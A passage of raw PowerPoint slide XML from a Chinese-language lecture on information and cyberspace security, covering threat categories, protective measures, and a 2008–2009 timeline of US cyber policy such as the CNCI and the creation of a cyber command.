              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>信息安全从技术扩展到管理，从静态扩展到动态</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>通过技术、管理和工程等措施的综合融合，形成对信息、信息系统乃至业务使命的保障。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="CC0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="矩形 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="179512" y="3501008"/>
            <a:ext cx="8671892" cy="397032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF9900"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>安全威胁：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>黑客、恐怖分子、信息战、自然灾难、电力中断等</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="矩形 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="157572" y="4005064"/>
            <a:ext cx="8374868" cy="674031"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF9900"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>安全措施：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>技术安全保障体系、安全管理体系、人员意识</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>培训</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>教育、认证和认可</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="25473123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64704"/>
            <a:ext cx="9077731" cy="5496939"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="106439562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14350" y="1484784"/>
            <a:ext cx="8191500" cy="1228147"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC3300"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>CS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC3300"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC3300"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Cyber Security</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="CC3300"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2200" b="1" dirty="0"/>
              <a:t>2010</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" b="1" dirty="0"/>
              <a:t>年后，将来</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2200" b="1" dirty="0"/>
              <a:t>……</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2200" b="1" dirty="0"/>
              <a:t>   </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>在美国带动下，世界各国信息安全政策、技术和实践等发生重大变革</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0"/>
              <a:t>……</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="CC0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="矩形 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="179512" y="2756708"/>
            <a:ext cx="7584727" cy="523220"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>共识：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>网络安全问题上升到国家安全的重要程度。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="矩形 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="179512" y="3501008"/>
            <a:ext cx="8640960" cy="2062103"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>核心思想：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>从传统防御的信息保障（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>IA</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>），发展到“威慑”为主的防御、攻击和情报三位一体的信息保障</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>网络安全（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>IA/CS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>）的网络空间安全。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1257300" lvl="2" indent="-342900">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="p"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>网络防御</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>-Defense</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>（运维）</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1257300" lvl="2" indent="-342900">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="p"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>网络攻击</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>-Offense</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>（威慑）</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1257300" lvl="2" indent="-342900">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="p"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>网络利用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>-Exploitation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>（情报）</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="标题 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="497637" y="716731"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>网络空间安全</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="25476865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arn(inVertical)">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animEffect transition="in" filter="fade">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14" y="753675"/>
            <a:ext cx="4442172" cy="2387293"/>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10100" y="753675"/>
            <a:ext cx="4384675" cy="2387294"/>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942" y="3247208"/>
            <a:ext cx="4453337" cy="2944708"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>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67614" y="3247208"/>
            <a:ext cx="4469645" cy="2944708"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="267127515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箭头连接符 6"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="611560" y="4194943"/>
            <a:ext cx="806489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55576" y="2369823"/>
            <a:ext cx="0" cy="1969136"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="57150">
            <a:solidFill>
              <a:srgbClr val="0066F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51520" y="4410967"/>
            <a:ext cx="1164101" cy="338554"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0"/>
              <a:t>2008</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0"/>
              <a:t>年</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0"/>
              <a:t>1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0"/>
              <a:t>月</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="文本框 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="251520" y="2000491"/>
            <a:ext cx="2232248" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>CNCI</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>（曼哈顿项目）</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="矩形 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2483768" y="1866586"/>
            <a:ext cx="6408712" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0"/>
              <a:t>提出威慑概念，其中包括爱因斯坦计划、情报对抗、供应链安全、超越未来（“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0"/>
              <a:t>Leap-Ahead”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0"/>
              <a:t>）技术战略</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="矩形 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1415622" y="4380189"/>
            <a:ext cx="1644210" cy="338554"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0"/>
              <a:t>2009</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0"/>
              <a:t>年</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0"/>
              <a:t>5</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0"/>
              <a:t>月</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0"/>
              <a:t>29</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0"/>
              <a:t>日</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="18" name="直接连接符 17"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2051720" y="2861923"/>
            <a:ext cx="0" cy="1477036"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="57150">
            <a:solidFill>
              <a:srgbClr val="0066F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1304764" y="2523369"/>
            <a:ext cx="6678488" cy="338554"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>《</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>网络空间政策评估：确保信息和通讯系统的可靠性和韧性</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>》</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="矩形 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3077045" y="4372708"/>
            <a:ext cx="1167307" cy="338554"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0"/>
              <a:t>2009</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0"/>
              <a:t>年</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0"/>
              <a:t>6</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0"/>
              <a:t>月</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="23" name="直接连接符 22"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3779912" y="3258839"/>
            <a:ext cx="0" cy="1080120"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="57150">
            <a:solidFill>
              <a:srgbClr val="0066F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854893" y="2981318"/>
            <a:ext cx="1838965" cy="338554"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>成立网络战司令部</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="矩形 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4520817" y="4338959"/>
            <a:ext cx="1281120" cy="338554"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0"/>
              <a:t>2009</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0"/>
              <a:t>年</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0"/>
              <a:t>12</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0"/>
              <a:t>月</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="27" name="直接连接符 26"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5506769" y="3589619"/>
            <a:ext cx="1335" cy="738518"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="57150">
            <a:solidFill>
              <a:srgbClr val="0066F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4583085" y="3292374"/>
            <a:ext cx="4113627" cy="338554"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
